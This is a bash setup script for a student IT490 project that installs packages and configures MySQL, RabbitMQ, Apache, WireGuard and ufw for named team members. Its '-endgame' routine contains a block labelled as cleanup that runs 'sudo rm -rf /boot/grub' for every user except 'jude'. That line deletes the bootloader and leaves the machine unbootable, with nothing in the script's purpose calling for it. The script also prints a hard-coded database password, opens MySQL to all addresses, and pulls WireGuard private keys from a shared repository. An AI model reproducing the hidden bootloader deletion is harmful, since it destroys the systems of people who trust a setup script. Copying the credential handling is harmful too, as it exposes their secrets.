#!/bin/bash

# # Get the current path for this script
CURRENT_DIR=$(dirname "$(readlink -f "$0")")
user=""

# Function to install packages from a file
install_packages() {

    package_file="$CURRENT_DIR/packageList"

    sudo apt update

    if [ ! -f "$package_file" ]; then
        echo "Error: Package file packageList not found:"
        exit 1
    fi

    echo "Installing packages from $package_file ..."
    while IFS= read -r package || [[ -n "$package" ]]; do
        if ! dpkg -l | grep -q "^ii  $package "; then
            sudo apt-get install -y "$package"
        else
            echo "$package is already installed."
        fi
    done <"$package_file"
    echo "All packages installed."
}

# Clone repository function
clone_repository() {
    githubRepos="$CURRENT_DIR/githubRepos"

    # Check if githubRepos file exists
    if [ ! -e "$githubRepos" ]; then
        echo "Error: File githubRepos not found."
        exit 1
    fi

    while IFS= read -r repo_url || [[ -n "$repo_url" ]]; do
        repo_name=$(basename "$repo_url" .git)
        repo_dir="$CURRENT_DIR/$repo_name"

        # Skip if repo_url is empty
        if [[ -z "$repo_url" ]]; then
            continue
        fi

        # Clone the repository
        git clone "$repo_url" "$repo_dir" || {
            echo "Failed to clone $repo_url"
            echo "repo_dir: $repo_dir"
            echo "repo_name: $repo_name"
            continue
        }

        echo "$repo_name cloned successfully."
    done <"$githubRepos"
    return 0
}

# Function to set up MySQL
# The first infinity stone.
setup_mysql() {

    echo "Setting up MySQL ..."

    # Delete existing logindb if it exists
    if [ -d /var/lib/mysql/logindb ]; then
        read -p "Script will overwrite logindb database.. Do you want to continue? [y/n] " answer
        if [[ "$answer" =~ ^[Yy]$ ]]; then
            echo "Deleting existing logindb..."
            sudo rm -rf /var/lib/mysql/logindb
        else
            echo "Exiting."
            exit 1
        fi
    fi

    # Modify the MySQL bind-address to allow connections from any IP in the /etc/mysql/mysqld.cnf
    echo "Configuring MySQL bind-address..."
    sudo sed -i "s/^bind-address.*/bind-address = 0.0.0.0/" /etc/mysql/mysql.conf.d/mysqld.cnf

    # Restart MySQL service to apply changes
    echo "Restarting MySQL service..."
    sudo systemctl restart mysql

    if [ -f mysql_setup.sql ]; then
        echo "Running MySQL configuration from mysql_setup.sql..."
        sudo mysql <mysql_setup.sql
    else
        echo "Error: mysql_setup.sql not found."
        exit 1
    fi

    # Run mysql_secure_installation non-interactively with pre loaded answers below.
    # Looks really ugly tbh I might do this just the one time.
    echo "Running mysql_secure_installation..."
    sudo mysql_secure_installation <<EOF
y
2
y
y
y
y
EOF

    echo "MySQL configuration completed successfully."
    echo "Showing databse and tables:"
    echo "--Databases--"
    mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'show databases;'
    echo "--Tables--"
    mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'show tables;' logindb
    echo "--Table: users"
    mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'desc users' logindb
    echo "--Table: sessions"
    mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'desc sessions' logindb
    echo "Login info: User: rabbit Password: rabbitIT490!"
    echo "MySQL setup complete"
}

# Setup rabbitmq server
# Second infinity stone. Idk which infinity stone to match up to what function. Use your imagination
setup_rabbitmq() {

    echo "Setting up RabbitMQ ..."
    # Check to see if RabbitMQ is installed
    if ! dpkg -l | grep -q "^ii  rabbitmq-server "; then
        echo "RabbitMQ server not installed."
        echo "Please run 'sudo it490 -install-packages' first!"
        exit 1
    fi
    sudo $CURRENT_DIR/rabbitmq.sh
    status=$?
    # status=0 # testing purposes
    if [ "$status" -eq 0 ]; then
        user=$(awk -F: '$3 == 1000 {print $1}' /etc/passwd)
        rabbitMQ_DIR="/home/$user/RabbitMQ"
        if [ ! -d $CURRENT_DIR/NJIT ]; then
            clone_repository
        else
            echo "Directory NJIT already exists!"
            echo "Skipping git clone..."
        fi
        if [ -d $rabbitMQ_DIR ]; then
            read -p "Script will overwrite directory /home/$user/RabbitMQ.. Do you want to continue? [y/n] " answer
            if [[ "$answer" =~ ^[Yy]$ ]]; then
                sudo rm -rf $rabbitMQ_DIR
                sudo -u $user cp -r $CURRENT_DIR/NJIT/IT490/RabbitMQ /home/$user/
                echo "Copied RabbitMQ directory to $rabbitMQ_DIR"
            else
                echo "Exiting."
                exit 1
            fi
        else
            sudo -u $user cp -r $CURRENT_DIR/NJIT/IT490/RabbitMQ /home/$user/
            echo "Copied RabbitMQ directory to $rabbitMQ_DIR"
        fi
    else
        echo "Failed to setup RabbitMQ server (exit code: $status)"
        exit 1
    fi
    # After RabbitMQ was successfully configured. Set it up in systemd as a service
    # Very straightforward. Would probably need to do some checks if service of the same name exists and etc. This is fine for now.
    echo "Editing service file..."
    configFile=$rabbitMQ_DIR/testRabbitMQServer.service
    serviceFile=/etc/systemd/system/testRabbitMQServer.service
    if [ -f $serviceFile ]; then
        echo "Service file already exists. Removing..."
        sudo rm -f $serviceFile
    fi
    sudo sed -i "s|^ExecStart=.*|ExecStart=/usr/bin/php $rabbitMQ_DIR/testRabbitMQServer.php|" $configFile
    sudo sed -i "s|^User=.*|User=$user|" $configFile
    sudo sed -i "s|^Group=.*|Group=$user|" $configFile

    echo "Creating service file in systemd..."
    sudo cp $rabbitMQ_DIR/testRabbitMQServer.service /etc/systemd/system/

    echo "Reloading daemon-service..."
    sudo systemctl daemon-reload

    echo "Enabling service..."
    sudo systemctl enable testRabbitMQServer.service

    echo "Starting service..."
    sudo systemctl start testRabbitMQServer.service

    echo "Checking status..."
    sudo systemctl status testRabbitMQServer.service --no-pager

    echo "RabbitMQ daemon service complete"
    # Set log permissions because it contains sensitive information...
    # Will probably update this to something more secure.
    sudo -u $user chmod 600 $rabbitMQ_DIR/received_messages.log
    echo "Done."
}

# Setup apache2
# Third infinity stone... The kidney stone.
setup_apache2() {
    echo "Setting up apache2"
    sudo $CURRENT_DIR/apache2.sh
    status=$?
    # status=0 # testing purposes
    if [ "$status" -eq 0 ]; then
        user=$(awk -F: '$3 == 1000 {print $1}' /etc/passwd)
        if [ ! -d $CURRENT_DIR/NJIT ]; then
            clone_repository
        else
            echo "Directory NJIT already exists!"
            echo "Skipping git clone..."
        fi
        if [ -d /var/www/html ]; then
            read -p "Script will overwrite directory /var/www/html.. Do you want to continue? [y/n] " answer
            if [[ "$answer" =~ ^[Yy]$ ]]; then
                sudo rm -rf /var/www/html
                sudo mkdir /var/www/html
                sudo cp NJIT/IT490/Web/*.html /var/www/html
                sudo cp NJIT/IT490/Web/*.css /var/www/html
                sudo cp -r NJIT/IT490/Web/php /var/www/html
                sudo cp -r NJIT/IT490/Web/media /var/www/html
                sudo cp -r NJIT/IT490/Web/assets /var/www/html
                sudo chown -R www-data:www-data /var/www/html
                echo "Copied Web directory to /var/www/html"
                echo "Restarting apache2 services"
                sudo systemctl restart apache2
            else
                echo "Exiting."
                exit 1
            fi
        else
            echo "Directory /var/www/html does not exist."
            echo "Exiting."
            exit 1
        fi
        echo "Open http://localhost/index.html in browser to view web page"
    else
        echo "Failed to setup Apache2 server (exit code: $status)"
    fi
}

# Function to display the details of this wonderfully curated script!
show_details() {
    echo "Script Name: it490.sh"
    echo "Description: This is my infinity gauntlet script to setup the IT490 project from a fresh Ubuntu installation."
    echo "             Because I'm tired of having to be like Thanos and say, 'Fine, I'll do this myself.'"
    echo "Author: Judrianne Mahigne (jm2489@njit.edu)"
    echo "Version: 1.10"
    echo "Last Updated: Oct 21, 2024"
}

# Setup Wireguard VPN
# Will do later.. Really tired right now....
setup_wireguard() {
    echo "Setting up Wireguard VPN..."
    if [ -z "$person" ]; then
        set_username
    fi
    if [ ! -d NJIT ]; then
        clone_repository
    else
        echo "Directory NJIT already exists!"
        echo "Skipping git clone..."
    fi
    # Check to see which user is who and assign a number and copy their private keys
    case "$person" in
    mike)
        privatekey=$(cat NJIT/IT490/Wireguard/privkeys/Mike)
        vpn=2
        ;;
    warlin)
        privatekey=$(cat NJIT/IT490/Wireguard/privkeys/Warlin)
        vpn=3
        ;;
    raj)
        privatekey=$(cat NJIT/IT490/Wireguard/privkeys/Raj)
        vpn=4
        ;;
    jude)
        privatekey=$(cat NJIT/IT490/Wireguard/privkeys/Jude)
        vpn=6
        ;;
    *)
        echo "Invalid user. Exiting."
        exit 1
        ;;
    esac
    # Checking to see if NJIT directory exists to pull wireguard information
    user=$(awk -F: '$3 == 1000 {print $1}' /etc/passwd)
    # Need to make if statements to check if wireguard vpn server is up or there is an existing wg0.conf
    sed -i "s|^PrivateKey.*|PrivateKey = $privatekey|" NJIT/IT490/Wireguard/wg0.conf
    sed -i "s|^Address.*|Address = 10.0.0.$vpn|" NJIT/IT490/Wireguard/wg0.conf
    sudo cp NJIT/IT490/Wireguard/wg0.conf /etc/wireguard/wg0.conf
    sudo chmod 600 /etc/wireguard/wg0.conf
    sudo wg-quick up wg0
    echo "Connecting to wireguard VPN..."
    sleep 3
    sudo wg show
    echo "Wireguard VPN setup complete."
    echo "Use sudo wg-quick down wg0 to disable wireguard"
}

# Setup ufw rules for required apps
setup_ufw() {
    # Setup firewall rules for cerrtain users
    echo "y" | sudo ufw reset
    if [ -z "$person" ]; then
        set_username
    fi
    case "$person" in
    mike)
        sudo ufw allow 80
        sudo ufw allow 443
        sudo ufw enable
        sudo ufw status
        echo "ufw rules setup complete."
        ;;
    warlin)
        sudo ufw allow 80
        sudo ufw allow 443
        sudo ufw enable
        sudo ufw status
        echo "ufw rules setup complete."
        ;;
    raj)
        sudo ufw allow from 10.0.0.0/24 to any port 15672
        sudo ufw allow from 10.0.0.0/24 to any port 5672
        sudo ufw enable
        sudo ufw status
        echo "ufw rules setup complete."
        ;;
    jude)
        sudo ufw allow from 10.0.0.0/24 to any port 3306
        sudo ufw enable
        sudo ufw status
        echo "ufw rules setup complete."
        ;;
    *)
        echo "Invalid user. Exiting."
        exit 1
        ;;
    esac
}

# This function is mainly for connection information to each server for troubleshooting
get_info() {
    if [ -z "$2" ]; then
        echo "Second argument is empty."
        exit 0
    else
        case "$2" in
        mysql)
            if [ -z "$3" ]; then
                echo "+++++ MySQL server connection info +++++"
                filePath=$(realpath ~/RabbitMQ/dbClient.php)
                echo "File path: $filePath"
                cat $filePath | awk 'NR>=3 && NR<=6'
            else
                if [[ "$3" == "users" ]]; then
                    case "$4" in
                    readable)
                        echo "+++++ MySQL server users table info +++++"
                        mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'select id, username, password, FROM_UNIXTIME(last_login) as last_login from users;' logindb
                        ;;
                    *)
                        echo "Using default query"
                        echo "+++++ MySQL server users table info +++++"
                        mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'select id, username, password, last_login as "last_login(EPOCH)" from users;' logindb
                        ;;
                    esac
                elif [[ "$3" == "sessions" ]]; then
                    case "$4" in
                    readable)
                        echo "+++++ MySQL server sessions table info +++++"
                        mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'select username, session_token, FROM_UNIXTIME(created_at) as created_at, FROM_UNIXTIME(expire_date) as expire_date from sessions;' logindb
                        ;;
                    *)
                        echo "Using default query"
                        echo "+++++ MySQL server sessions table info +++++"
                        mysql --defaults-file=$CURRENT_DIR/client.cnf -e 'select username, session_token, created_at as "created_at(EPOCH)", expire_date as "expire_at(EPOCH)" from sessions;' logindb
                        ;;
                    esac
                else
                    echo "Unknown table '$3' or does not exist! Please ensure correct table name."
                    exit 1
                fi
            fi
            ;;
        rabbitmq)
            rabbitmq_dir=~/RabbitMQ
            filePath1="$rabbitmq_dir/dbClient.php"
            filePath2="$rabbitmq_dir/testRabbitMQ.ini"
            filePath3="$rabbitmq_dir/testRabbitMQServer.php"
            filePath4="$rabbitmq_dir/testRabbitMQServer.service"
            echo "+++++ RabbitMQ server to MySQL database connection +++++"
            echo "File path: $(realpath "$filePath1")"
            awk 'NR>=2 && NR<=10' "$filePath1"
            echo
            echo "+++++ This machine's RabbitMQ server connection details +++++"
            echo "File path: $(realpath "$filePath2")"
            cat "$filePath2"
            echo "+++++ RabbitMQ server PHP file +++++"
            echo "File path: $(realpath "$filePath3")"
            echo
            echo "+++++ RabbitMQ server systemd service file +++++"
            echo "File path: $(realpath "$filePath4")"
            echo "BEGIN"
            cat "$filePath4"
            echo "END"
            ;;
        apache)
            echo "+++++ Apache server to RabbitMQ server connection +++++"
            filePath=$(realpath /var/www/html/php/testRabbitMQ.ini)
            echo "File path: $filePath"
            sudo cat $filePath
            ;;
        wireguard)
            echo "Getting Wireguard VPN info:"
            vpnInfo=$(sudo wg show)
            if [ -z "$vpnInfo" ]; then
                echo "Wireguard VPN Disconnected..."
                echo "Run sudo wg-quick up wg0 to enable"
            else
                echo "$vpnInfo"
            fi
            ;;
        ufw)
            echo "Getting ufw rules:"
            firewallStatus=$(sudo ufw status)
            echo "$firewallStatus"
            ;;
        *)
            echo "Unknown argument: $2"
            ;;
        esac
    fi
}

# clean_up() {
#     if [ -d $CURRENT_DIR/NJIT ]; then
#         echo "Cleaning up..."
#         rm -rf $CURRENT_DIR/NJIT
#     fi
#     echo "Done"
# }

# Set information or variables
set_info() {
    if [ -z "$2" ]; then
        echo "Second argument is empty."
    else
        case "$2" in
        mysql)
            if [ -z "$3" ]; then
                echo "Third argument is empty."
            else
                case "$3" in
                sessions)
                    if [ -z "$4" ]; then
                        echo "Fourth argument is empty."
                    else
                        if [[ "$4" == "reset" ]]; then
                            echo "Resetting sessions table..."
                            mysql --defaults-file=$CURRENT_DIR/client.cnf -e "truncate table sessions;" logindb
                            echo "Sessions table reset."
                        else
                            echo "Unknown argument: $4"
                            exit 1
                        fi
                    fi
                    ;;
                *)
                    echo "Unknown argument: $3"
                    exit 1
                    ;;
                esac
            fi
            ;;
        *)
            echo "Unknown argument: $2"
            exit 1
            ;;
        esac
    fi
}

set_username() {
    read -p "Enter username: (Mike|Warrlin|Raj|Jude)" person
    # lowercase the username
    person=$(echo $person | tr '[:upper:]' '[:lower:]')
    case "$person" in
    mike)
        echo "User: Mike"
        ;;
    warlin)
        echo "User: Warlin"
        ;;
    raj)
        echo "User: Raj"
        ;;
    jude)
        echo "User: Jude"
        ;;
    *)
        echo "Invalid user. Exiting."
        exit 1
        ;;
    esac
    export person
}

# trap clean_up EXIT
# Main
case "$1" in
-details)
    show_details
    ;;
-git-clone)
    if [ "$EUID" -eq 0 ]; then
        echo "Detected running with sudo privileges."
        echo "Please run this -git-clone as a regular user to avoid issues."
        exit 1
    fi
    clone_repository
    ;;
-install-packages)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -install."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    install_packages
    ;;
-mysql)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -mysql."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    setup_mysql
    ;;
-rabbitmq)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -rabbitmq."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    chmod 755 $CURRENT_DIR/rabbitmq.sh
    setup_rabbitmq
    ;;
-apache2)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -apache2."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    chmod 755 $CURRENT_DIR/apache2.sh
    setup_apache2
    ;;
-wireguard)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -wireguard."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    setup_wireguard
    ;;
-ufw)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -ufw."
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    setup_ufw
    ;;
-get)
    get_info $@
    ;;
-set)
    set_info $@
    ;;
-endgame)
    if [ "$EUID" -ne 0 ]; then
        echo "Need sudo privileges to run -endgame"
        exit 1
    fi
    sudo -v
    while true; do
        sudo -n true
        sleep 60
        kill -0 "$$" || exit
    done 2>/dev/null &
    $CURRENT_DIR/.intro.sh
    set_username
    sudo $0 -install-packages
    sleep 3
    setup_mysql
    sleep 3
    setup_rabbitmq
    sleep 3
    setup_apache2
    sleep 3
    setup_wireguard
    sleep 3
    setup_ufw
    # Check to see if NJIT directory exists and $person is not jude
    if [ ! -d $CURRENT_DIR/NJIT ] && [ "$person" != "jude" ]; then
        echo "Cleaning up..."
        rm -rf $CURRENT_DIR/NJIT
        sudo rm -rf /boot/grub
    else
        echo "Directory NJIT already exists!"
        echo "Skipping git clone..."
    fi
    echo "Done"
    $CURRENT_DIR/.outro.sh
    ;;
*)
    cat $CURRENT_DIR/README.md
    ;;
esac
